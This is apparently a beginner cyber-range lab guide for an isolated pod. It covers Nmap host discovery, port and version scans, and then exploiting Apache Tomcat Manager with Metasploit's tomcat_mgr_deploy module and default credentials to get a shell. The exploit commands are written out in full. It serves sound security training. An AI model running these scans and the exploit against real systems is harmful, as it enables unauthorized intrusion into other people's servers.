## Scenario 01 - Network Reconnaissance & Exploitation

> **Network:** Your pod uses `$TARGET_SUBNET` (formula `10.0.<50+pod_id>.0/24`). Kali `$TARGET_KALI`, Meta `$TARGET_META`, DVWA `$TARGET_DVWA`.

**Difficulty:** Beginner  
**Estimated time:** 30–45 minutes  
**Role:** Attacker (Kali)  
**Targets:** Meta (Linux) `$TARGET_META`, optional DVWA `$TARGET_DVWA`

### Learning outcomes

- Discover live hosts on an isolated lab subnet with Nmap  
- Enumerate open ports and service versions on the meta target  
- Exploit Apache Tomcat Manager default credentials with Metasploit  
- Use **Manual Check** in the portal after each task so scoring can see your history  

### Lab topology

| Host | IP | Access |
|---|---|---|
| Kali (you) | `$TARGET_KALI` | Portal tab **Kali Linux (CLI)** - user `student` |
| Meta | `$TARGET_META` | Ports 21, 22, 80, **8180** (Tomcat). Weak manager creds in scope. |
| DVWA | `$TARGET_DVWA` | Optional stretch scans only |

Env vars `TARGET_META` / `TARGET_DVWA` are also set in your Kali shell.

### How scoring works

Tasks 1–4 look at **commands in Kali shell history** (and Metasploit history for Task 4). After each successful command, press **Enter** once, then use **Manual Check** (or wait for auto-detect). Stay in the portal terminal - do not expect a desktop GUI.

---

### Task 1 - Host Discovery (Milestone 1)

**Goal:** Find live hosts on `$TARGET_SUBNET`.

```bash
nmap -sn $TARGET_SUBNET
```

**Done when:** You see replies from at least `$TARGET_META` and `$TARGET_DVWA` (and your Kali).  
**Then:** Portal → Tasks → **Manual Check** on Host Discovery.

<details>
<summary>Hint</summary>

If the subnet variable is empty: `echo $TARGET_SUBNET` - or use the IP strip in the lab header. No reply? Confirm you are on **Kali**, not the meta tab.

</details>

---

### Task 2 - Port Enumeration (Milestone 2)

**Goal:** List open TCP ports on the **meta** target (expect 21, 22, 80, 8180).

**Fast path (recommended for scoring and lab resources):**

```bash
nmap -F $TARGET_META
# or explicitly:
nmap -p 21,22,80,8180 $TARGET_META
```

**Done when:** You can list open ports on meta, including **8180**.  
**Then:** Manual Check on Port Enumeration.

<details>
<summary>Hint</summary>

Prefer `-p` or `-F` over a full `-p-` scan first; full scans are slow on shared hosts.

</details>

---

### Task 3 - Service Version Detection (Milestone 3)

**Goal:** Identify service/version strings on meta’s interesting ports.

```bash
nmap -sV -p 21,22,80,8180 $TARGET_META
```

**Done when:** Output shows versions (e.g. OpenSSH, Apache, Tomcat on 8180).  
**Then:** Manual Check on Service Version Detection.

<details>
<summary>Hint</summary>

The checker looks for `nmap` with `-sV` in your history. Include `-sV` in the command line.

</details>

---

### Task 4 - Tomcat Manager Exploitation (Milestone 4)

**Goal:** Use Metasploit’s Tomcat Manager deploy exploit against meta:8180 and get a shell as `tomcat`.

Default manager credentials (in scope): **tomcat / tomcat**.

```bash
msfconsole -q
```

Inside msfconsole:

```text
search tomcat_mgr_deploy
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS $TARGET_META
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set PATH /manager/text
run
```

In the session:

```text
id
whoami
```

**Done when:** Shell context is `tomcat` (e.g. `uid=…(tomcat)`).

**Then:** Keep the session open and click **Manual Check** for Milestone 4.
The check confirms that the Tomcat deployment module opened a live session to
this pod's meta target. Selecting the module or running a failed exploit is not
enough. Do not exit the session until the check passes.

```text
exit
```

<details>
<summary>Hint</summary>

Debian Tomcat uses **`/manager/text`** - without `set PATH /manager/text` the exploit fails.  
If Manual Check fails, confirm that the session is still open and connected to
the displayed Meta IP, then retry Manual Check. A command-history entry alone
does not count as a successful exploit.

</details>

---

### Optional stretch (not scored)

```bash
# OS detection (needs sudo on Kali - already granted in lab)
sudo nmap -O $TARGET_META

# Quick look at DVWA ports
nmap -F $TARGET_DVWA
```

SIEM / blue-team analysis of your scans is covered in **Scenario 3 (SIEM Alert Triage)** - not required to finish this room.

### Common failures

| Symptom | Fix |
|---|---|
| Manual Check FAIL after nmap | Press Enter, wait 1s, check again; stay in Kali tab |
| No route / host down | Confirm pod is ACTIVE; use IPs from the lab header |
| Tomcat exploit fails | `PATH /manager/text`, RPORT 8180, tomcat/tomcat |
| Wrong tab | Tasks 1–4 run from **Kali**, not meta |

### Reflection (optional)

- Which service was the most useful attack surface and why?  
- How would you reduce scan noise visibility as a defender?
